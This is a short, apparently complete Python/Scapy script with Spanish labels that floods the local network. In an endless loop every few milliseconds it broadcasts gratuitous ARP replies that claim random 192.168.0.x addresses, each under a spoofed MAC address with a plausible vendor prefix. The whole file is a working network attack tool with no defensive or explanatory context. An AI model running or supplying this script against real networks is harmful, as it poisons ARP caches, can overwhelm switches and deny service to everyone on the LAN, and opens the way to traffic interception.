from scapy.all import *
import random
import time

destMAC = "FF:FF:FF:FF:FF:FF"

lista_vendors = [
    "b8:e8:56",
    "00:1a:2b",
    "3c:4d:5e"
]

ip_base = "192.168.0."

while True:
    try:
        randTimer = random.uniform(0.001, 0.02)
        randVendor = random.choice(lista_vendors)

        randMAC = randVendor + ":" + ":".join(RandMAC().split(":")[3:])

        randIP = ip_base + str(random.randint(2, 254))

        relleno = b"\x00" * 18

        print(f"Envío con MAC: {randMAC}")

        sendp(
            Ether(src=randMAC, dst=destMAC) /
            ARP(
                op=2,
                psrc=randIP,
                pdst=randIP,
                hwdst=destMAC,
                hwsrc=randMAC
            ) /
            Padding(load=relleno),
            verbose=0
        )

        time.sleep(randTimer)
    except KeyboardInterrupt:
        break
